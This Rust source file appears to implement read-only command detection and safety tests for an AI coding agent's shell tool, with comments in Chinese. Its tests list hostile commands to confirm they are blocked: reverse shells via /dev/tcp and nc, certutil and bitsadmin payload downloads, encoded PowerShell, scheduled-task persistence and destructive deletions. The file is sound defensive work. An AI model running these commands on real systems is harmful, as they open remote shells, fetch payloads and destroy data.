//! # readonly.rs — 只读命令判定逻辑
//!
//! 判断给定命令是否为不改变系统或文件状态的纯读取操作，这类操作可以免弹窗确认。
//!
//! ## Key Exports
//! - `is_readonly_command()`: 跨平台判断命令是否为只读
//! - `is_readonly_git_args()`: git 子命令的只读判定（RunGitCommand 工具与 shell 共用）
//! - `is_readonly_command_windows()`: Windows 只读判定
//! - `is_readonly_command_unix()`: Unix 只读判定
//!
//! ## Dependencies
//! - Internal: `super::guards`, `super::regexes`
//! - External: `regex`

use super::guards::*;
use super::regexes::*;
use regex::Regex;

/// 把一条命令行切成"会被真正执行的各段"。
///
/// 分隔符覆盖两种 shell 里"执行下一条命令"的全部写法：
/// 管道 `|`、语句分隔 `;`、逻辑 `&&` / `||`、Windows cmd 的顺序执行 `&`、以及换行。
///
/// **为什么必须切**：只读判定如果只看第一个 `|` 之前的部分，
/// `Get-ChildItem; Remove-Item x` 会被判成"只读命令"——既有的"只读免弹窗"、
/// 以及只读保护的"只放行只读命令"，都会被一个分号直接绕过。
///
/// 切分是**保守**的：引号里的 `;` 也会被切开（可能把一条只读命令判成非只读），
/// 但方向安全——宁可拦错，不可放过。
fn split_command_segments(cmd: &str) -> Vec<&str> {
    cmd.split(|c| matches!(c, '|' | ';' | '&' | '\n' | '\r'))
        .map(str::trim)
        .filter(|segment| !segment.is_empty())
        .collect()
}

/// git 子命令的只读判定（**唯一口径**）。
///
/// 两处消费方：shell 命令里的 `git ...` 段（本模块），以及 `RunGitCommand` 工具本身。
/// 两边共用这一份，避免"工具放行、shell 拦截"这种口径分裂。
///
/// 两道关：
/// 1. 第一个非选项词必须落在 [`READONLY_GIT_ARGS`] 白名单里；
/// 2. 参数里不能出现能把内容写到任意路径的选项（`--output=<file>`）。
///
/// 注意这是**白名单**：不在名单里的（`add` / `commit` / `restore` / `stash` / `apply`
/// / `branch` / `tag` / `remote` / `config` …）一律算非只读。
pub fn is_readonly_git_args(args: &[&str]) -> bool {
    let Some(sub) = args
        .iter()
        .find(|arg| !arg.starts_with('-'))
        .map(|arg| arg.to_lowercase())
    else {
        return false;
    };
    if !READONLY_GIT_ARGS.iter().any(|allowed| *allowed == sub) {
        return false;
    }
    // `git log --output=x` / `git diff --output=x` 会写文件；`--exec` 会执行命令
    !args.iter().any(|arg| {
        let lower = arg.to_lowercase();
        lower.starts_with("--output") || lower.starts_with("--exec")
    })
}

/// - 管道中如果包含写操作 cmdlet 则不算只读
pub fn is_readonly_command_windows(cmd: &str) -> bool {
    // 安全约束：包含危险模式的不算只读
    if command_substitution_re().is_match(cmd) {
        return false;
    }
    // 赋值操作
    if Regex::new(r"(?i)\$\w+\s*=").unwrap().is_match(cmd) {
        return false;
    }
    // 输出重定向到文件（> 但不是 > $null 和 > NUL 和 > /dev/null）
    if cmd.contains('>') {
        // 提取 > 后面的内容，检查是否为安全的空重定向
        if let Some(gt_pos) = cmd.find('>') {
            let after = cmd[gt_pos + 1..].trim_start();
            let after_lower = after.to_lowercase();
            if !after_lower.starts_with("$null")
                && !after_lower.starts_with("nul")
                && !after_lower.starts_with("/dev/null")
                && !after_lower.starts_with("&")
            {
                return false;
            }
        }
    }
    // Splatting
    if Regex::new(r"@\w+").unwrap().is_match(cmd) {
        return false;
    }

    // 按命令分隔符切开，检查每一段
    for segment in split_command_segments(cmd) {
        let name = extract_command_name(segment);
        if name.is_empty() {
            continue;
        }

        // 检查是否为只读 PowerShell cmdlet
        if READONLY_CMDLETS.iter().any(|c| *c == name) {
            continue;
        }

        // 检查只读外部命令
        if name == "git" {
            // git 子命令检查：与 RunGitCommand 工具共用同一份判定
            let git_args: Vec<&str> = segment.split_whitespace().skip(1).collect();
            if !is_readonly_git_args(&git_args) {
                return false;
            }
            continue;
        }

        if name == "gh" {
            let gh_sub = segment
                .split_whitespace()
                .nth(1)
                .unwrap_or("")
                .to_lowercase();
            // gh pr/issue 需要检查第三级子命令
            if gh_sub == "pr" || gh_sub == "issue" {
                let gh_action = segment
                    .split_whitespace()
                    .nth(2)
                    .unwrap_or("")
                    .to_lowercase();
                if !READONLY_GH_PR_ISSUE_ACTIONS.iter().any(|a| *a == gh_action) {
                    return false;
                }
            } else if !READONLY_GH_ARGS.iter().any(|a| *a == gh_sub) {
                return false;
            }
            continue;
        }

        if name == "docker" {
            let docker_sub = segment
                .split_whitespace()
                .nth(1)
                .unwrap_or("")
                .to_lowercase();
            if !READONLY_DOCKER_ARGS.iter().any(|a| *a == docker_sub) {
                return false;
            }
            continue;
        }

        // 检查 Windows 只读命令
        //
        // 必须是**整词**相等：原先这里是 `*c == name || name.starts_with(c)`，
        // 名单里的 `set` 于是把 `setx`（写用户环境变量）也判成了只读、免弹窗放行。
        if READONLY_WIN_COMMANDS.iter().any(|c| *c == name) {
            continue;
        }

        // 未知命令 → 不是只读
        return false;
    }

    true
}

// --- 破坏性命令警告 ---

/// Unix 只读命令检测
pub fn is_readonly_command_unix(cmd: &str) -> bool {
    // 安全约束
    if command_substitution_re().is_match(cmd) {
        return false;
    }
    if Regex::new(r"\$\w+\s*=").unwrap().is_match(cmd) {
        return false;
    }
    // 重定向到文件（> 但不是 > /dev/null 和 > &2）
    if cmd.contains('>') {
        if let Some(gt_pos) = cmd.find('>') {
            let after = cmd[gt_pos + 1..].trim_start();
            if !after.starts_with("/dev/null") && !after.starts_with("&") {
                return false;
            }
        }
    }
    if Regex::new(r"@\w+").unwrap().is_match(cmd) {
        return false;
    }

    for segment in split_command_segments(cmd) {
        let name = extract_command_name(segment);
        if name.is_empty() {
            continue;
        }

        // git 子命令检查
        if name == "git" {
            let git_args: Vec<&str> = segment.split_whitespace().skip(1).collect();
            if !is_readonly_git_args(&git_args) {
                return false;
            }
            continue;
        }

        // gh 子命令检查
        if name == "gh" {
            let gh_sub = segment
                .split_whitespace()
                .nth(1)
                .unwrap_or("")
                .to_lowercase();
            if gh_sub == "pr" || gh_sub == "issue" {
                let gh_action = segment
                    .split_whitespace()
                    .nth(2)
                    .unwrap_or("")
                    .to_lowercase();
                if !READONLY_GH_PR_ISSUE_ACTIONS.iter().any(|a| *a == gh_action) {
                    return false;
                }
            } else if !READONLY_GH_ARGS.iter().any(|a| *a == gh_sub) {
                return false;
            }
            continue;
        }

        if READONLY_UNIX_COMMANDS.iter().any(|c| *c == name) {
            continue;
        }

        return false;
    }
    true
}

// --- 主入口 ---

/// 主入口：对命令进行安全检查（中等严格级别，按平台自动分发）
///
/// 检查顺序：Block 类先检查（高危），Warn 类后检查（中危）。
/// 只读命令检测（按平台自动分发）
pub fn is_readonly_command(cmd: &str) -> bool {
    if cfg!(target_os = "windows") {
        is_readonly_command_windows(cmd)
    } else {
        is_readonly_command_unix(cmd)
    }
}

#[cfg(test)]
mod tests {
    use super::super::security::{check_command_safety, get_destructive_warning, SafetyResult};
    use super::*;

    // --- 基础检查 ---

    #[test]
    pub fn test_empty_command() {
        assert_eq!(
            check_command_safety(""),
            SafetyResult::Block("命令为空。".to_string())
        );
        assert_eq!(
            check_command_safety("   "),
            SafetyResult::Block("命令为空。".to_string())
        );
    }

    #[test]
    pub fn test_safe_commands() {
        assert_eq!(check_command_safety("dir"), SafetyResult::Safe);
        assert_eq!(check_command_safety("Get-ChildItem"), SafetyResult::Safe);
        assert_eq!(check_command_safety("echo hello"), SafetyResult::Safe);
        assert_eq!(check_command_safety("git status"), SafetyResult::Safe);
        assert_eq!(check_command_safety("cargo check"), SafetyResult::Safe);
        assert_eq!(check_command_safety("npm install"), SafetyResult::Safe);
    }

    #[test]
    pub fn test_reverse_shell_blocked() {
        assert!(matches!(
            check_command_safety("bash -i >& /dev/tcp/1.2.3.4/80"),
            SafetyResult::Block(_)
        ));
        assert!(matches!(
            check_command_safety("mkfifo /tmp/f"),
            SafetyResult::Block(_)
        ));
        assert!(matches!(
            check_command_safety("nc -e /bin/sh 1.2.3.4 80"),
            SafetyResult::Block(_)
        ));
    }

    #[test]
    pub fn test_base64_blocked() {
        assert!(matches!(
            check_command_safety("echo 'aGVsbG8=' | base64 -d"),
            SafetyResult::Block(_)
        ));
        assert!(matches!(
            check_command_safety("[Convert]::FromBase64String('aGVsbG8=')"),
            SafetyResult::Block(_)
        ));
    }

    #[test]
    pub fn test_iex_blocked() {
        assert!(matches!(
            check_command_safety("Invoke-Expression 'Get-Process'"),
            SafetyResult::Block(_)
        ));
        assert!(matches!(
            check_command_safety("iex 'Get-Process'"),
            SafetyResult::Block(_)
        ));
    }

    #[test]
    pub fn test_web_request_blocked() {
        assert!(matches!(
            check_command_safety("Invoke-WebRequest http://example.com"),
            SafetyResult::Block(_)
        ));
        assert!(matches!(
            check_command_safety("wget http://example.com"),
            SafetyResult::Block(_)
        ));
        assert!(matches!(
            check_command_safety("curl http://example.com"),
            SafetyResult::Block(_)
        ));
    }

    #[test]
    pub fn test_start_process_blocked() {
        assert!(matches!(
            check_command_safety("Start-Process notepad"),
            SafetyResult::Block(_)
        ));
    }

    #[test]
    pub fn test_net_webclient_blocked() {
        assert!(matches!(
            check_command_safety("(New-Object Net.WebClient).DownloadString('http://x')"),
            SafetyResult::Block(_)
        ));
    }

    // --- 新增：PowerShell 深度安全检查 ---

    #[test]
    pub fn test_encoded_command_blocked() {
        assert!(matches!(
            check_command_safety("powershell -EncodedCommand SGVsbG8="),
            SafetyResult::Block(_)
        ));
        assert!(matches!(
            check_command_safety("pwsh -enc SGVsbG8="),
            SafetyResult::Block(_)
        ));
    }

    #[test]
    pub fn test_download_utilities_blocked() {
        assert!(matches!(
            check_command_safety("certutil -urlcache -split -f http://x/payload.exe"),
            SafetyResult::Block(_)
        ));
        assert!(matches!(
            check_command_safety("bitsadmin /transfer job http://x/payload.exe C:\\temp\\p.exe"),
            SafetyResult::Block(_)
        ));
        assert!(matches!(
            check_command_safety("Start-BitsTransfer -Source http://x/file -Destination C:\\temp"),
            SafetyResult::Block(_)
        ));
    }

    #[test]
    pub fn test_com_object_blocked() {
        assert!(matches!(
            check_command_safety("New-Object -ComObject WScript.Shell"),
            SafetyResult::Block(_)
        ));
        assert!(matches!(
            check_command_safety("New-Object -ComObject Shell.Application"),
            SafetyResult::Block(_)
        ));
    }

    #[test]
    pub fn test_scheduled_task_blocked() {
        assert!(matches!(check_command_safety("Register-ScheduledTask -TaskName 'Updater' -Action (New-ScheduledTaskAction -Execute 'cmd.exe')"), SafetyResult::Block(_)));
        assert!(matches!(
            check_command_safety("schtasks /create /tn 'Updater' /tr 'cmd.exe' /sc daily"),
            SafetyResult::Block(_)
        ));
    }

    #[test]
    pub fn test_runas_blocked() {
        assert!(matches!(
            check_command_safety("Start-Process powershell -Verb RunAs"),
            SafetyResult::Block(_)
        ));
    }

    #[test]
    pub fn test_wmi_invoke_blocked() {
        assert!(matches!(
            check_command_safety(
                "Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList 'cmd.exe'"
            ),
            SafetyResult::Block(_)
        ));
        assert!(matches!(check_command_safety("Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine='cmd.exe'}"), SafetyResult::Block(_)));
    }

    #[test]
    pub fn test_unc_path_blocked() {
        assert!(matches!(
            check_command_safety("dir \\\\server\\share"),
            SafetyResult::Block(_)
        ));
        assert!(matches!(
            check_command_safety("copy \\\\192.168.1.1\\share\\file.txt C:\\"),
            SafetyResult::Block(_)
        ));
    }

    // --- 新增：Warn 类检查 ---

    #[test]
    pub fn test_long_running_warned() {
        assert!(matches!(
            check_command_safety("npm run dev"),
            SafetyResult::Warn(_)
        ));
        assert!(matches!(
            check_command_safety("pnpm dev"),
            SafetyResult::Warn(_)
        ));
        assert!(matches!(
            check_command_safety("vite"),
            SafetyResult::Warn(_)
        ));
        assert!(matches!(
            check_command_safety("flask run"),
            SafetyResult::Warn(_)
        ));
    }

    #[test]
    pub fn test_sleep_warned() {
        assert!(matches!(
            check_command_safety("sleep 5"),
            SafetyResult::Warn(_)
        ));
        assert!(matches!(
            check_command_safety("Start-Sleep 5"),
            SafetyResult::Warn(_)
        ));
    }

    #[test]
    pub fn test_node_modules_warned() {
        assert!(matches!(
            check_command_safety("dir node_modules"),
            SafetyResult::Warn(_)
        ));
        assert!(matches!(
            check_command_safety("ls node_modules"),
            SafetyResult::Warn(_)
        ));
    }

    #[test]
    pub fn test_control_chars_blocked() {
        assert!(matches!(
            check_command_safety("echo\x00test"),
            SafetyResult::Block(_)
        ));
        assert!(matches!(
            check_command_safety("echo\x07test"),
            SafetyResult::Block(_)
        ));
    }

    #[test]
    pub fn test_dangerous_variables_blocked() {
        assert!(matches!(
            check_command_safety("echo $RANDOM"),
            SafetyResult::Block(_)
        ));
        assert!(matches!(
            check_command_safety("echo $PPID"),
            SafetyResult::Block(_)
        ));
    }

    #[test]
    pub fn test_module_loading_warned() {
        assert!(matches!(
            check_command_safety("Import-Module ActiveDirectory"),
            SafetyResult::Warn(_)
        ));
        assert!(matches!(
            check_command_safety("Install-Module -Name Az"),
            SafetyResult::Warn(_)
        ));
    }

    #[test]
    pub fn test_dotnet_method_warned() {
        assert!(matches!(
            check_command_safety("[System.IO.File]::ReadAllText('C:\\test.txt')"),
            SafetyResult::Warn(_)
        ));
    }

    #[test]
    pub fn test_alias_manipulation_warned() {
        assert!(matches!(
            check_command_safety("Set-Alias -Name ls -Value Get-ChildItem"),
            SafetyResult::Warn(_)
        ));
    }

    // --- 只读命令检测 ---

    #[test]
    pub fn test_readonly_cmdlets() {
        assert!(is_readonly_command("Get-ChildItem"));
        assert!(is_readonly_command("dir"));
        assert!(is_readonly_command("Get-Content file.txt"));
        assert!(is_readonly_command("type file.txt"));
        assert!(is_readonly_command("Select-String 'pattern' file.txt"));
        assert!(is_readonly_command("Get-Process"));
        assert!(is_readonly_command("Test-Path C:\\temp"));
        assert!(is_readonly_command("Get-Date"));
        assert!(is_readonly_command("whoami"));
        assert!(is_readonly_command("hostname"));
        assert!(is_readonly_command("ipconfig"));
        assert!(is_readonly_command("systeminfo"));
    }

    #[test]
    pub fn test_readonly_git() {
        assert!(is_readonly_command("git status"));
        assert!(is_readonly_command("git diff"));
        assert!(is_readonly_command("git log --oneline -10"));
        assert!(is_readonly_command("git show HEAD"));
        assert!(!is_readonly_command("git push"));
        assert!(!is_readonly_command("git commit -m 'test'"));
        assert!(!is_readonly_command("git reset --hard"));
    }

    #[test]
    pub fn test_readonly_gh() {
        assert!(is_readonly_command("gh pr list"));
        assert!(is_readonly_command("gh issue view 123"));
        assert!(!is_readonly_command("gh pr create"));
    }

    #[test]
    pub fn test_readonly_docker() {
        assert!(is_readonly_command("docker ps"));
        assert!(is_readonly_command("docker images"));
        assert!(is_readonly_command("docker logs container_id"));
        assert!(!is_readonly_command("docker run ubuntu"));
        assert!(!is_readonly_command("docker rm container_id"));
    }

    #[test]
    pub fn test_not_readonly_with_substitution() {
        assert!(!is_readonly_command("Get-Content $(Get-Item file.txt)"));
        assert!(!is_readonly_command("$x = Get-Process"));
        assert!(!is_readonly_command("Get-Process > output.txt"));
    }

    #[test]
    pub fn test_readonly_pipeline() {
        assert!(is_readonly_command(
            "Get-Process | Where-Object {$_.CPU -gt 100}"
        ));
        assert!(is_readonly_command("dir | Sort-Object Name"));
        assert!(!is_readonly_command("Get-Process | Stop-Process"));
    }

    #[test]
    pub fn test_command_chaining_is_not_readonly() {
        // 分隔符以前只切了 `|`：`Get-ChildItem; Remove-Item x` 会被判成"只读命令"，
        // 于是既有的"只读免弹窗"和只读保护都能被一个分号绕过。
        assert!(!is_readonly_command("Get-ChildItem; Remove-Item x"));
        assert!(!is_readonly_command("dir && del foo.txt"));
        assert!(!is_readonly_command("dir || Remove-Item -Recurse ."));
        assert!(!is_readonly_command("Get-Process\ndel foo.txt"));
    }

    #[test]
    pub fn test_readonly_command_name_matches_whole_word_only() {
        // 名单里的 `set` 曾经靠前缀匹配把 `setx` 也带成只读（setx 会写用户环境变量）
        assert!(!is_readonly_command("setx PATH evil"));
        assert!(!is_readonly_command("set FOO=bar"));
        assert!(!is_readonly_command("label D: MyDisk"));
        assert!(!is_readonly_command("schtasks /create /tn x /tr y"));
    }

    #[test]
    pub fn test_readonly_git_args_is_a_whitelist() {
        // 这些以前全是"黑名单漏网"：`git restore .` / `stash` / `apply` 能直接丢掉未提交的改动
        let non_readonly: &[&[&str]] = &[
            &["restore", "."],
            &["stash"],
            &["apply", "x.patch"],
            &["add", "-A"],
            &["rm", "-r", "src"],
            &["branch", "-D", "main"],
            &["tag", "-d", "v1"],
            &["remote", "add", "origin", "url"],
            &["config", "user.name", "x"],
            &["clean", "-fd"],
            &["checkout", "."],
            &["push"],
            &["commit", "-m", "x"],
        ];
        for args in non_readonly {
            assert!(!is_readonly_git_args(args), "{:?} 不该被判只读", args);
        }

        assert!(is_readonly_git_args(&["status"]));
        assert!(is_readonly_git_args(&["log", "--oneline", "-10"]));
        assert!(is_readonly_git_args(&["diff", "--stat"]));
        // 能把内容写到任意路径的选项
        assert!(!is_readonly_git_args(&["log", "--output=foo.txt"]));
    }

    // --- 破坏性命令警告 ---

    #[test]
    pub fn test_destructive_remove() {
        assert!(get_destructive_warning("Remove-Item -Recurse -Force C:\\temp").is_some());
        assert!(get_destructive_warning("rm -rf /tmp/test").is_some());
    }

    #[test]
    pub fn test_destructive_git() {
        assert!(get_destructive_warning("git reset --hard HEAD~1").is_some());
        assert!(get_destructive_warning("git push --force origin main").is_some());
        assert!(get_destructive_warning("git clean -fd").is_some());
    }

    #[test]
    pub fn test_destructive_sql() {
        assert!(get_destructive_warning("DROP TABLE users").is_some());
        assert!(get_destructive_warning("TRUNCATE TABLE logs").is_some());
    }

    #[test]
    pub fn test_destructive_system() {
        assert!(get_destructive_warning("Stop-Computer").is_some()); // 停止计算机
        assert!(get_destructive_warning("Clear-RecycleBin -Force").is_some()); // 清空回收站
    }

    #[test]
    pub fn test_not_destructive() {
        assert!(get_destructive_warning("Get-ChildItem").is_none());
        assert!(get_destructive_warning("git status").is_none());
        assert!(get_destructive_warning("echo hello").is_none());
    }
}
